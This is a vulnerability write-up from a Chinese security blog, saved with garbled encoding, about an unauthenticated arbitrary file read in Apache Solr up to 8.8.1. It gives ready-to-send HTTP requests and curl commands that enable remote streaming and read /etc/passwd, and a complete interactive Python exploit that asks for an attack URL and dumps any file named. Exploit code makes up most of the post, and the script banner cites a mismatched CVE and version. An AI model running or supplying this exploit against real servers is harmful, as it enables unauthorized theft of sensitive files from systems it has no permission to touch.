<meta name="referrer" content="no-referrer"/>
> æœ¬æ–‡ç”± [ç®€æ‚¦ SimpRead](http://ksria.com/simpread/) è½¬ç ï¼Œ åŸæ–‡åœ°å€ [mp.weixin.qq.com](https://mp.weixin.qq.com/s/2D3bLaUVD6Lz7VqRu8dOGA)

![](https://mmbiz.qpic.cn/mmbiz_gif/ibicicIH182el5PaBkbJ8nfmXVfbQx819qWWENXGA38BxibTAnuZz5ujFRic5ckEltsvWaKVRqOdVO88GrKT6I0NTTQ/640?wx_fmt=gif)

**ä¸€****ï¼šæ¼æ´æè¿°ğŸ‘**

Apache Solr å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨æœªæˆæƒçš„æƒ…å†µä¸‹è·å–ç›®æ ‡æœåŠ¡å™¨æ•æ„Ÿæ–‡ä»¶

**äºŒ:Â  æ¼æ´å½±å“ğŸ‡**

**Apache Solr <= 8.8.1**

**ä¸‰:Â  æ¼æ´å¤ç°ğŸ‹**

**è®¿é—® Solr Admin ç®¡ç†å‘˜é¡µé¢**

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el64rRLVwxr8OFmJJ8QfRlrOF9j6yibMKuhtuZ81sHwF9repsOjQ9RyxH4svkM9W0W3OXibOCicug9YgA/640?wx_fmt=png)

è·å– core çš„ä¿¡æ¯  

```
http://xxx.xxx.xxx.xxx/solr/admin/cores?indexInfo=false&wt=json
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el64rRLVwxr8OFmJJ8QfRlrOWt9YsL9R1HqF3qDNJteR6FNO3AE63GkfoicDVFbuHDNrDMWH3RNSapw/640?wx_fmt=png)

å‘é€è¯·æ±‚

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el64rRLVwxr8OFmJJ8QfRlrOBBTefXg9M3svDricSaLmoIiaX65dEjaqA4yITsq0jVYaBQmUBQucHzNg/640?wx_fmt=png)

è¯·æ±‚åŒ…å¦‚ä¸‹

```
POST /solr/ckan/config HTTP/1.1
Host: xxx.xxx.xxx:8983
Content-Length: 99
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://118.31.46.134:8983
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://118.31.46.134:8983/solr/ckan/config
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Connection: close

{"set-property":{"requestDispatcher.requestParsers.enableRemoteStreaming":true},"olrkzv64tv":"="}
```

å†è¿›è¡Œæ–‡ä»¶è¯»å–

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el64rRLVwxr8OFmJJ8QfRlrOb3W7mQmffS7icTCrLfQoCgMqedPMgCRHe4eQkKBYMgtrhgia4tWsWuyQ/640?wx_fmt=png)

```
POST /solr/ckan/debug/dump?param=ContentStreams HTTP/1.1
Host: xxx.xxx.xxx.xxx:8983
Content-Length: 29
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36
Origin: http://118.31.46.134:8983
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://118.31.46.134:8983/solr/ckan/config
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Connection: close

stream.url=file:///etc/passwd
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el64rRLVwxr8OFmJJ8QfRlrObxBTqjfYGrDiacc8ArfDx1cnZpd4vWKIsTxv82UzNIkwhcfUKQ5fiaxw/640?wx_fmt=png)

```
Curlè¯·æ±‚ä¸º
curlÂ -dÂ '{"set-property"Â :Â {"requestDispatcher.requestParsers.enableRemoteStreaming":true\}\}'Â http://xxx.xxx.xxx.xxx:8983/solr/{corename}/configÂ -HÂ 'Content-type:application/json'
curl "http://xxx.xxx.xxx.xxx:8983/solr/db/debug/dump?param=ContentStreams" -F "stream.url=file://etc/passwd"
```

****å››:Â  æ¼æ´ POCğŸ¦‰****

```
POCè¿˜æ˜¯å»ºç«‹åœ¨æœªæˆæƒè®¿é—®çš„æƒ…å†µä¸‹
```

```
import requests
import sys
import random
import re
import base64
import time
from lxml import etree
import json
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech           \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0        \033[0m')
    print('+  \033[34må…¬ä¼—å·  : PeiQiæ–‡åº“                        \033[0m')
    print('+  \033[34mVersion: Apache Solr < 8.2.0            \033[0m')
    print('+  \033[36mä½¿ç”¨æ ¼å¼: python3 CVE-2019-0193.py       \033[0m')
    print('+  \033[36mUrl    >>> http://xxx.xxx.xxx.xxx:8983  \033[0m')
    print('+  \033[36mFile   >>> æ–‡ä»¶åç§°æˆ–ç›®å½•                  \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    core_url = target_url + "/solr/admin/cores?indexInfo=false&wt=json"
    try:
        response = requests.request("GET", url=core_url, timeout=10)
        core_name = list(json.loads(response.text)["status"])[0]
        print("\033[32m[o] æˆåŠŸè·å¾—core_name,Urlä¸ºï¼š" + target_url + "/solr/" + core_name + "/config\033[0m")
        return core_name
    except:
        print("\033[31m[x] ç›®æ ‡Urlæ¼æ´åˆ©ç”¨å¤±è´¥\033[0m")
        sys.exit(0)

def POC_2(target_url, core_name):
    vuln_url = target_url + "/solr/" + core_name + "/config"
    headers = {
        "Content-type":"application/json"
    }
    data = '{"set-property" : {"requestDispatcher.requestParsers.enableRemoteStreaming":true\}\}'
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5)
        print("\033[36m[o] æ­£åœ¨å‡†å¤‡æ–‡ä»¶è¯»å–...... \033[0m".format(target_url))
        if "This" in response.text and response.status_code == 200:
            print("\033[32m[o] ç›®æ ‡ {} å¯èƒ½å­˜åœ¨æ¼æ´ \033[0m".format(target_url))
        else:
            print("\033[31m[x] ç›®æ ‡ {} ä¸å­˜åœ¨æ¼æ´\033[0m".format(target_url))
            sys.exit(0)

    except Exception as e:
        print("\033[31m[x] è¯·æ±‚å¤±è´¥ \033[0m", e)

def POC_3(target_url, core_name, File_name):
    vuln_url = target_url + "/solr/{}/debug/dump?param=ContentStreams".format(core_name)
    headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = 'stream.url=file://{}'.format(File_name)
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5)
        if "No such file or directory" in response.text:    
            print("\033[31m[x] è¯»å–{}å¤±è´¥ \033[0m".format(File_name))
        else:
            print("\033[36m[o] å“åº”ä¸º:\n{} \033[0m".format(json.loads(response.text)["streams"][0]["stream"]))


    except Exception as e:
        print("\033[31m[x] è¯·æ±‚å¤±è´¥ \033[0m", e)

if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl >>> \033[0m"))
    core_name = POC_1(target_url)
    POC_2(target_url, core_name)
    while True:
        File_name = str(input("\033[35mFile >>> \033[0m"))
        POC_3(target_url, core_name, File_name)
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el64rRLVwxr8OFmJJ8QfRlrO51iaBThiaQNJdFAHmUbiaqYgibMrQD79FUFd4OqmE7kzUibib4eDKYf9S0RQ/640?wx_fmt=png)

**å››:Â  å‚è€ƒæ–‡ç« ğŸ‹**
--------------

[https://mp.weixin.qq.com/s/HMtAz6_unM1PrjfAzfwCUQ](https://mp.weixin.qq.com/s?__biz=MzIxNDAyNjQwNg==&mid=2456098142&idx=1&sn=b025147c7c4855801a1132d0e41f0e6e&scene=21#wechat_redirect)

æœ€å
--

> ä¸‹é¢å°±æ˜¯æ–‡åº“çš„å…¬ä¼—å·å•¦ï¼Œæ›´æ–°çš„æ–‡ç« éƒ½ä¼šåœ¨ç¬¬ä¸€æ—¶é—´æ¨é€åœ¨å…¬ä¼—å·
> 
> æƒ³è¦åŠ å…¥äº¤æµç¾¤çš„å¸ˆå‚…å…¬ä¼—å·ç‚¹å‡»äº¤æµç¾¤åŠ æˆ‘æ‹‰ä½ å•¦~  
> 
> åˆ«å¿˜äº† Github ä¸‹è½½å®Œç»™ä¸ªå°æ˜Ÿæ˜Ÿâ­
> 
> https://github.com/PeiQi0/PeiQi-WIKI-POC

å…¬ä¼—å·